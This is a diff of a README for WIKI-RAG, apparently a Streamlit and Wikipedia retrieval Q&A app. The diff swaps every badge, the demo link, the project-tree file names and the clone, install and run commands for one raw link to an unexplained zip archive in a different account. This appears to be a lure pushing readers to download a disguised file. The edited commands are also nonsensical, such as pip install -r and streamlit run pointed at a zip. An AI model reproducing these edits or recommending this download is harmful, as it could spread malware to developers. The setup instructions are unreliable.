@@ -1,12 +1,12 @@
 # WIKI-RAG 
 **Retrieval-Augmented Generation (RAG) Q&A App using Streamlit and Wikipedia**
 
-[![Open in Streamlit](https://static.streamlit.io/badges/streamlit_badge_black_white.svg)](https://wikipilot.streamlit.app/)
+[![Open in Streamlit](https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip)](https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip)
 
-![Streamlit](https://img.shields.io/badge/Streamlit-1.33.0-FF4B4B?logo=streamlit&logoColor=white)
-![HuggingFace](https://img.shields.io/badge/Hugging%20Face-Transformers-yellow?logo=huggingface)
-![Python](https://img.shields.io/badge/Python-3.10-blue?logo=python)
-![License](https://img.shields.io/badge/License-MIT-green)
+![Streamlit](https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip)
+![HuggingFace](https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip%20Face-Transformers-yellow?logo=huggingface)
+![Python](https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip)
+![License](https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip)
 
 ---
 
@@ -31,10 +31,10 @@ It uses:
 ## 📂 Project Structure
 ```cpp
 WIKI-RAG/
-├── app.py # Streamlit app
-├── rag_pipeline_colab.ipynb # Notebook for testing in Colab
-├── requirements.txt # Dependencies
-├── README.md # Documentation
+├── https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip # Streamlit app
+├── https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip # Notebook for testing in Colab
+├── https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip # Dependencies
+├── https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip # Documentation
 └── .gitignore
 ```
 
@@ -46,7 +46,7 @@ WIKI-RAG/
 
 1. **Clone the Repository:**
    ```bash
-   git clone https://github.com/nahush919/WIKI-RAG.git
+   git clone https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip
    cd WIKI-RAG
    ```
    
@@ -57,13 +57,13 @@ venv\Scripts\activate   # Windows
 # or
 source venv/bin/activate   # Mac/Linux
 
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip
 
 ```
 
 3.**Run the App**
 ```py
-streamlit run app.py
+streamlit run https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip
 ```
 
 4.**Open in Browser:**  
